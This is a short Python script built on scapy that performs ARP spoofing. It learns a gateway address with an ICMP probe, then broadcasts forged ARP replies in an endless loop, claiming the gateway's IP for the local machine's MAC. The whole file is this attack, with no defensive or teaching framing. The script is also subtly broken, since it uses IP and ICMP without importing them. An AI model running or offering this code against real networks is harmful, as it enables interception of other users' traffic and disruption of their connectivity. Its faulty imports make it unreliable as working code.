#!/usr/bin/env python
# -*- coding: utf-8 -*-


from scapy.all import get_if_hwaddr, getmacbyip, ARP, Ether, sendp, sr1

def sendPkg(pkg):
    sendp(pkg, inter=2, iface='eth0')


def makeArp(mac):
    p = sr1(IP(dst='10.0.0.1', ttl= 0)/ICMP()/"XXXX")
    gatewayip = p.src
    pkg = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=gatewayip, op=2)
    return pkg


def main():
    mac = get_if_hwaddr('eth0')
    pkg = makeArp(mac)
    while True:
        sendPkg(pkg)


if __name__ == '__main__':
    main()

